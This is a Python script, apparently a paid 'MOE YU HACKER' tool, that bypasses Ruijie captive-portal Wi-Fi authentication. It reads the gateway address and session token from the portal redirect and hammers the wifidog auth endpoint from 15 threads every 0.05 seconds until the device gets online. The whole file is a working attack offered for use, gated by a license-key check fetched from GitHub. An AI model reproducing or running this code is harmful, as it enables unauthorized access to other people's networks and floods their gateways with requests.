import requests
import re
import urllib3
import time
import threading
import random
import sys
import datetime
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
PING_THREADS = 15 

# COLORS
GREEN = "[bold #00FF00]"
RED = "[bold #FF0000]"
CYAN = "[bold #00FFFF]"
RESET = "\033[0m"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Ruijie Multi-Bypass... )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

# ===============================
# SECURITY & AUTH SYSTEM
# ===============================

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[white]YOUR HWID: [yellow]{my_hwid}[/yellow][/white]", title=f"{RED}SECURITY INFO[/]", border_style="cyan", expand=False)))
    
    try:
        user_key = input(f"\n  {RESET}[ACCESS_KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        
        res = requests.get(KEY_URL, timeout=10)
        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
        
        for entry in lines:
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print(f"\n{RED}❌ HWID MISMATCH!{RESET}")
                    sys.exit()
                
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                if is_active:
                    console.print(f"\n{GREEN}>>> AUTHENTICATING... ACCESS GRANTED!{RESET}")
                    return True
        console.print(f"\n{RED}❌ INVALID KEY!{RESET}")
        sys.exit()
    except:
        console.print(f"\n{RED}📡 CONNECTION ERROR!{RESET}")
        sys.exit()

# ===============================
# UNIVERSAL RUIJIE BYPASS ENGINE
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU UNIVERSAL BYPASS v12.0 🔥[/bold white]"), border_style="red", expand=False))
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    })

    while True:
        try:
            # Internet ရှိမရှိ အရင်စစ်မယ်
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204:
                sys.stdout.write(f"\r{GREEN}[+] Status: Connected (Online) ✅{RESET}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # Portal Redirect ဖြစ်သွားရင် URL ကို ဖတ်မယ်
            portal_url = check.url
            console.print(f"\n{CYAN}[!] Ruijie Portal Detected: {portal_url}{RESET}")
            
            parsed_url = urlparse(portal_url)
            query = parse_qs(parsed_url.query)
            
            # --- Dynamic IP & Token Detection ---
            # URL ထဲမှာပါတဲ့ Gateway IP ကို အလိုအလျောက်ယူမယ် (192.168.61.1 ဖြစ်ဖြစ်၊ 110.1 ဖြစ်ဖြစ် အလုပ်လုပ်မယ်)
            gw_ip = query.get('gw_address', [None])[0]
            if not gw_ip:
                # URL ထဲမှာ gw_address မပါရင် Hostname/IP ကို Direct ယူမယ်
                gw_ip = parsed_url.netloc.split(':')[0]

            gw_port = query.get('gw_port', ['2060'])[0]
            
            # Ruijie ရဲ့ Version ပေါ်မူတည်ပြီး Token အမျိုးမျိုးကို ရှာမယ်
            sid = (query.get('chap_challenge', [None])[0] or 
                   query.get('sessionId', [None])[0] or 
                   query.get('token', [None])[0])

            if sid and gw_ip:
                # Ruijie Standard Auth Link
                auth_link = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                console.print(f"{GREEN}[✓] Targeted Gateway: {gw_ip}:{gw_port}{RESET}")
                
                def pulse_attack():
                    while True:
                        try:
                            # Server ဆီ High-frequency Pulse ပို့ခြင်း
                            session.get(auth_link, timeout=5, verify=False)
                            sys.stdout.write(f"\r{GREEN}[✓] Pulse Active | Gateway: {gw_ip} | Token: {sid[:10]}...{RESET}")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.05) 

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_attack, daemon=True).start()
                
                # အင်တာနက် ပွင့်မပွင့် အမြဲစစ်နေမယ်
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(10)
                        else: break
                    except: break
            else:
                console.print(f"{RED}[×] Could not extract necessary Info. Retrying...{RESET}")
                time.sleep(3)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        sys.exit()
